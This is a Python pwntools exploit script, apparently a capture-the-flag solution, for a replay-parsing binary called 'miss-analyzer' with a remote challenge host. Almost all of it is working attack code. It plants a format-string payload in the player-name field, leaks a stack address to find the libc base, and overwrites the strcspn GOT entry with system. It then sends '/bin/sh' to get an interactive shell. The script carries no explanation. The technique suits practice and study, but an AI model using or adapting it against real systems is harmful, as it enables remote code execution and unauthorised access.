#!/usr/bin/env python3
import binascii
import sys, os
from pwn import *
context.update(
    arch="amd64",
    endian="little",
    os="linux",
    log_level="debug",
    terminal=["tmux", "split-window", "-h", "-p 65"],
)

REMOTE = False
TARGET=os.path.realpath("/root/osu/miss-analyzer/miss-analyzer/analyzer")
elf = ELF(TARGET)
libc = ELF('./libc.so.6')

def attach(r):
    if not REMOTE:
        bkps = ['*main', '*0x401941', '*0x401a10']
        cmds = []
        gdb.attach(r, '\n'.join(["break {}".format(x) for x in bkps] + cmds))
    return

def exploit(r):
    attach(r)

    fsb_payload = b'%51$p'

    payload = b'\0' # set mode
    payload += b'\0' * 4 # consume_bytes

    payload += b'\v' # start string
    payload += b'\1' # length(1)
    payload += b'A' # hash

    payload += b'\v' # start string
    payload += p8(len(fsb_payload)) # length
    payload += fsb_payload # player name (FSB)

    payload += b'\v' # start string
    payload += b'\1' # length(1)
    payload += b'B' # dummy

    payload += b'\0' * 10 # consume_bytes
    payload += b'\0' * 2 # miss count

    r.sendlineafter(b'Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):\n', binascii.hexlify(payload))
    r.recvuntil(b'Player name: ')

    ret_addr = int(r.recvline().strip().decode(), 16)
    libc_base = ret_addr - libc.libc_start_main_return
    strcspn_got = elf.got['strcspn']
    system = libc_base + libc.sym['system']

    log.info(f'ret_addr: {hex(ret_addr)}')
    log.info(f'libc_base: {hex(libc_base)}')

    fsb_payload = fmtstr_payload(14, {strcspn_got: system})

    log.info(f'fsb_payload: {fsb_payload}')
    log.info(f'len(fsb_payload): {len(fsb_payload)}')

    payload = b'\0' # set mode
    payload += b'\0' * 4 # consume_bytes

    payload += b'\v' # start string
    payload += b'\4' # length(1)
    payload += b'A' * 4 # hash

    payload += b'\v' # start string
    payload += p8(len(fsb_payload)) # length
    payload += fsb_payload # player name (FSB)

    payload += b'\v' # start string
    payload += b'\4' # length(0x20)
    payload += b'B' * 4 # dummy

    payload += b'\0' * 10 # consume_bytes
    payload += b'\0' * 2 # miss count

    r.sendlineafter(b'Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):\n', binascii.hexlify(payload))
    r.sendlineafter(b'Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):\n', b'/bin/sh')
    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("chal.osugaming.lol", 7273)
    else:
        REMOTE = False
        r = process([TARGET,], env={'LD_PRELOAD':'./libc.so.6'})
    exploit(r)
    exit(0)
